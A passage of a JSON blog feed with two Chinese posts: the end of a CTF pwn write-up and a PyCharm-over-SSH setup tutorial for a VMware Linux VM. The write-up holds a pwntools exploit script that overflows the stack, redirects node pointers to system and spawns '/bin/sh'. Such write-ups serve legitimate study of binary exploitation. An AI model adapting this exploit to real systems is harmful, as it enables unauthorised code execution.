21]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"3 0 3 0 3 0 0\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>system <span class=\"token operator\">=</span> <span class=\"token number\">0x080485A0</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>n3 <span class=\"token operator\">=</span> <span class=\"token number\">0x804b0a8</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>nr <span class=\"token operator\">=</span> <span class=\"token number\">0x08048CDA</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">'aaaa'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>nr<span class=\"token punctuation\">)</span> <span class=\"token comment\">#首先利用__gg 函数执行 node1 中的__nr 函数</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">'bbbb'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\n\\n\\n\\n\"</span> <span class=\"token comment\">#接着写入 system 地址到 node2 等待第二次 call，最后 4 个 \\n 跳过剩下 4 个 node->name 的修改</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0xfc</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>n3<span class=\"token punctuation\">)</span> <span class=\"token comment\">#栈溢出，修改 n3->next1 指向的内容</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>之所以为什么是要修改 <code>n3-&gt;next1</code> ，因为 system 地址写入到了 node2 的 name 中，当 <code>__gg</code>  函数执行时，此时栈顶排列为</p>\n<p>| n3 |</p>\n<p>| --- |</p>\n<p>| n4 |</p>\n<p>| n5 |</p>\n<p>| n6 |</p>\n<p>| name |</p>\n<p>| num |</p>\n<p>接下来就要执行 system 函数，所以要修改 n3 指向的地址。</p>\n",
            "tags": [
                "CTF",
                "CTF"
            ]
        },
        {
            "id": "https://a1oyss.github.io/%E6%9D%82%E8%AE%B0/Pycharm+VMware%E6%90%AD%E5%BB%BALinux%E4%B8%8B%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/",
            "url": "https://a1oyss.github.io/%E6%9D%82%E8%AE%B0/Pycharm+VMware%E6%90%AD%E5%BB%BALinux%E4%B8%8B%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/",
            "title": "Pycharm+VMware搭建Linux下开发环境",
            "date_published": "2020-10-08T10:44:09.000Z",
            "content_html": "<p>#IDE</p>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>弄了一天的 vim+xshell，结果还是不尽人意，spacevim 要求终端支持真彩色，但是 xshell 显然⑧行，将 <code>enable_guicolors</code>  设置为 false 后才勉强能看。</p>\n<p>于是突发奇想，将 pycharm 通过 ssh 连接到虚拟机当中的 python 环境，能不能直接在主机上面写脚本调试，查了下还真有这个功能，不过需要 pro 版本。</p>\n<h1 id=\"准备工作\"><a class=\"anchor\" href=\"#准备工作\">#</a> 准备工作</h1>\n<ol>\n<li>PyCharm Pro</li>\n<li>VMware Workstation</li>\n<li>科学上网</li>\n</ol>\n<h1 id=\"配置\"><a class=\"anchor\" href=\"#配置\">#</a> 配置</h1>\n<h2 id=\"主题\"><a class=\"anchor\" href=\"#主题\">#</a> 主题</h2>\n<p>File-&gt;Settings..-&gt;Plugins，安装 Material Theme UI，接着按照自己喜欢的来配就行</p>\n<h2 id=\"配置ssh-interpreter\"><a class=\"anchor\" href=\"#配置ssh-interpreter\">#</a> 配置 SSH Interpreter</h2>\n<p>安装好 PyCharm Pro 之后，创建一个项目，创建好之后找到 File-&gt;Settings..-&gt;Project: ctf-&gt;Project Interpreter 配置 python 解释器</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153037485-394af4f2-19fa-4fc5-bf3d-39ae5070cc1e.png\" alt=\"\" /></p>\n<p>选择 Add..-&gt;SSH Interpreter</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153038413-b7c8f816-bc23-4b7d-8bd8-b942a9a3bc7a.png\" alt=\"\" /></p>\n<p>将虚拟机的 ip 地址和用户名填写到相应的地方，然后 NEXT。</p>\n<p>填写密码</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153037359-53ad4c7a-e476-4f78-a933-0c20d1a5599a.png\" alt=\"\" /></p>\n<p>设置解释器路径和文件同步位置，然后 FINISH</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153037610-0c30b0ee-f187-4e09-b062-efe90dbd551b.png\" alt=\"\" /></p>\n<p>FINISH 之后 PyCharm 会先进行一次同步，同步 python 库，并且把一些配置文件什么的给传过去，时间略长。</p>\n<p>PyCharm 的同步还有版本对比功能</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153039519-485d68c3-bdd4-4077-b6e2-803a96d51c72.png\" alt=\"\" /></p>\n<p>不得不说比预想中还要好用。</p>\n<h2 id=\"配置hexo\"><a class=\"anchor\" href=\"#配置hexo\">#</a> 配置 hexo</h2>\n<p>File-&gt;Settings..-&gt;Tools-&gt;Terminal 中可以设置 PyCharm 的终端</p>\n<p>将 Start directory 设置为 hexo 根目录</p>\n<p>shell path 可以直接填写终端名称，例如 powershell.exe</p>\n<p>Tab name，标签名称，随便修改。</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153037444-308883fb-4fa7-4e19-b28f-8dc1e5bc9836.png\" alt=\"\" /></p>\n<p>这样就可以随时进行 hexo 的相关操作了。</p>\n<h2 id=\"配置ssh-terminal\"><a class=\"anchor\" href=\"#配置ssh-terminal\">#</a> 配置 SSH Terminal</h2>\n<p>File-&gt;Settings..-&gt;Tools-&gt;SSH Terminal</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153037542-9d00c3ac-9446-4e4a-87fe-aabca5182ef0.png\" alt=\"\" /></p>\n<p>Deloyment server 中选择 root@xxx.xxx.xxx.xxx:22</p>\n<p>这样每次打开就不需要再选一次了。</p>\n<h1 id=\"faq\"><a class=\"anchor\" href=\"#faq\">#</a> FAQ</h1>\n<h2 id=\"pycharm中进行调试后console中输出\"><a class=\"anchor\" href=\"#pycharm中进行调试后console中输出\">#</a> PyCharm 中进行调试后，console 中输出□=</h2>\n<p>应该是 PyCharm 的问题，有两种解决办法：</p>\n<ol>\n<li>Run-&gt;Edit Configurations..-&gt;Templates-&gt;Python-&gt;Enviroment variables 中添加环境变量</li>\n</ol>\n<p>PWNLIB_NOTERM=True</p>\n<ol start=\"2\">\n<li>修改 <code>/usr/local/lib/python2.7/dist-packages/pwnlib/args.py</code>  最后一行，注释掉 <code>term.init()</code></li>\n</ol>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>pro 版本还是好用，配置好之后，直接在一个窗口中进行所有操作，不需要几个窗口之间来回切了，方便了不少。</p>\n",
            "tags": [
                "杂记",
                "IDE",
                "Pycharm"
            ]
        }
    ]
}